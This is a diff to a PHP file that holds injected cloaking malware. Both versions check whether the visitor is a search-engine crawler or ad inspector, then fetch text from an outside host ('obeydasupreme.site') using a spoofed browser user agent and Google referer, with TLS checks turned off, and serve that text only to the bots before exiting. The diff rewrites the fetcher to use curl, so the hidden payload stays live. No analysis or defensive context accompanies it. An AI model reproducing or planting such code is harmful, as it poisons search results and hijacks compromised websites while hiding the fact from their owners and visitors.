@@ -1,29 +1,28 @@
 <?php
 @ob_start();
-header("Vary: U-Agent");
-
-$request_uri = $_SERVER['REQUEST_URI'] ?? '/';
-
-$src = "https://obeydasupreme.site/badboys/unjambi.txt";
-$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
-$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
-
-function stealth($u) {
-    $ctx = stream_context_create([
-        "http" => [
-            "method" => "GET",
-            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
-                        "Referer: https://www.google.com/\r\n"
-        ]
+header("Vary: User-Agent");
+$targetUrl = "https://obeydasupreme.site/badboys/unjambi.txt";
+$botPattern = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+function fetchContentCurl($url) {
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        CURLOPT_REFERER => "https://www.google.com/",
+        CURLOPT_CONNECTTIMEOUT => 5,
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false
     ]);
-    return @file_get_contents($u, false, $ctx);
+    $content = curl_exec($ch);
+    curl_close($ch);
+    return $content ?: '';
 }
-
-if (preg_match($match, $ua)) {
-    usleep(rand(100000, 200000));
-    if (stripos($request_uri, '/') !== false) {
-        echo stealth($src);
-    }
+if (preg_match($botPattern, strtolower($userAgent))) {
+    usleep(random_int(100000, 200000));
+    echo fetchContentCurl($targetUrl);
     @ob_end_flush();
     exit;
 }
